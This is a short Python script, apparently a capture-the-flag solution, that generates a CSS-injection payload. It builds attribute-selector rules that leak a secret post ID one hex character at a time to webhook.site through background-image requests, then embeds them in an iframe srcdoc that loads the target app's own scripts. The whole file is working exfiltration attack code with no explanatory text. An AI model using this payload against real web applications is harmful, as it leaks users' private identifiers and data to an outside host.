WEBHOOK = "https://webhook.site/"
alphabet = "01234556789abcdef"
known = "1867a000c7b8"

css = ""

for c in alphabet:
    query = known + c
    css += f"""a[href^='/post/{query}'] {{
    background-image: url('{WEBHOOK}?{query}')
}}
"""

payload = """<iframe srcdoc="
<!DOCTYPE html>
<html>
  <head>
    <style>
    """ + css + """
    </style>
    <script type='module' crossorigin src='/assets/index.7352e15a.js'></script>
  </head>
  <body>
    <iframe name='defaultView' src='/home'></iframe>
    <div id='root'></div>
  </body>
</html>
" style='width:50vw; height: 50vh'></iframe>"""

with open('payload.txt', 'w') as f:
    f.write(payload)